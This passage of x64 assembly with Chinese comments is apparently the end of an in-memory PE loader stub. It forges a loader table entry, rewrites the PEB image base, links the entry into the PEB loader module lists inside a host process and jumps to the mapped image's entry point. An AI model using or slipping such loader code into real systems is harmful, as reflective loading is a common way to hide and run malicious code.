    ; 按“已入表”去摘链也只是改写我们自己这块内存，不会破坏宿主进程的哈希链。
    lea   rax, [rbx + 0x70]
    mov   [rbx + 0x70], rax
    mov   [rbx + 0x78], rax

    ; Flags / TlsIndex 清零：不参与 DllMain 通知，避免退出时被当成 DLL 回调
    mov   dword [rbx + 0x68], 0
    mov   word [rbx + 0x6E], 0

    mov   [rbx + 0x30], rbp                 ; DllBase
    mov   rax, [rsp + 0x48]                 ; EntryPoint RVA
    add   rax, rbp
    mov   [rbx + 0x38], rax                 ; EntryPoint
    mov   eax, [rsp + 0x38]                 ; SizeOfImage
    mov   [rbx + 0x40], eax
    mov   word [rbx + 0x48], r11w           ; FullDllName.Length
    mov   word [rbx + 0x4A], r11w           ; FullDllName.MaximumLength
    lea   rax, [rbx + 0x200]
    mov   [rbx + 0x50], rax                 ; FullDllName.Buffer
    mov   word [rbx + 0x58], r11w           ; BaseDllName.Length
    mov   word [rbx + 0x5A], r11w           ; BaseDllName.MaximumLength
    lea   rax, [rbx + 0x400]
    mov   [rbx + 0x60], rax                 ; BaseDllName.Buffer

    ; PEB->ImageBaseAddress = 新映像基址
    mov   rax, gs:[0x60]          ; PEB
    mov   [rax + 0x10], rbp
    mov   rdi, [rax + 0x18]       ; PEB->Ldr

    ldr_insert_tail 0x10, 0x00    ; InLoadOrderModuleList
    ldr_insert_tail 0x20, 0x10    ; InMemoryOrderModuleList
    ldr_insert_tail 0x30, 0x20    ; InInitializationOrderModuleList
.no_ldr_entry:

    ; ==== 14. 跳转入口点 ====
    mov   rax, [rsp + 0x48]       ; EntryPoint RVA
    add   rax, rbp
    add   rsp, 0xA8
    jmp   rax

fail_late:
fail_early:
    add   rsp, 0xE8
    ret

; ---------------------------------------------------------------------------
; 桩结束标记 —— args block 紧跟其后
; ---------------------------------------------------------------------------
str_kernelbase: db 'kernelbase.dll', 0
str_getcmdline: db 'GetCommandLineW', 0
str_msvcrt:     db 'msvcrt.dll', 0
str_wcmdln:     db '_wcmdln', 0
str_ntdll:      db 'ntdll.dll', 0
str_rtladdft:   db 'RtlAddFunctionTable', 0
str_ntqueryvm:  db 'NtQueryVirtualMemory', 0
args_block:
